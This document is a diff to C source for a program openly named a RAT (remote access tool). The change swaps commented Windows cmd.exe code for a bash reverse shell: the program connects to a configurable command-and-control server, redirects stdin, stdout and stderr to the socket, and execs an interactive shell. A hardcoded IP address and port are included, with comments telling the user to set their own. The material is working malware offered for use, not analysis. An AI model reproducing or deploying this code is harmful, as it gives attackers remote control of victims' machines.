@@ -3,7 +3,6 @@
 #include <time.h>
 #include <string.h>
 
-
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
@@ -64,24 +63,8 @@ void RAT(char* C2_Server, int C2_Port)
                     dup2(tcp_sock,1); // STDOUT
                     dup2(tcp_sock,2); // STDERR
 
-                    // char Process[] = "cmd.exe";
-                    // STARTUPINFO sinfo;
-                    // PROCESS_INFORMATION pinfo;
-
-                    // memset(&sinfo, 0, sizeof(sinfo));
-                    // sinfo.cb = sizeof(sinfo);
-                    // sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-                    // sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcp_sock;
-
-                    // CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
-
-                    // // We are here, hanging in the cmd.exe process until it is closed by a TERM or exit command
-                    // WaitForSingleObject(pinfo.hProcess, INFINITE); 
-
-                    // CloseHandle(pinfo.hProcess);
-                    // CloseHandle(pinfo.hThread);
-
-
+                    // execute bin/bash << 0,1,2
+                    execl("/bin/bash","sh","-i",NULL,NULL);
 
 
                     memset(CommandReceived, 0, sizeof(CommandReceived));
@@ -137,29 +120,16 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
+            }
         }
-        
-
     }
 }
 
 int main (int argc, char **argv)
 {
-  int tcp_sock;
-  struct sockaddr_in client;
- 
-  client.sin_family = AF_INET;
-  client.sin_addr.s_addr = inet_addr(C2_Server);
-  client.sin_port = htons(C2_Port);
-
-  tcp_sock = socket(AF_INET,SOCK_STREAM,0);
-  connect(tcp_sock,(struct sockaddr *)&client,sizeof(client));
-
-  dup2(tcp_sock,0); // STDIN
-  dup2(tcp_sock,1); // STDOUT
-  dup2(tcp_sock,2); // STDERR
-
-  execl("/bin/bash","sh","-i",NULL,NULL);
+    char host[] = "192.168.75.100";     // change this to your ip address
+    int port = 1337;                    // change this to your open port
+    RAT(host, port);
 
   return 0;
 }
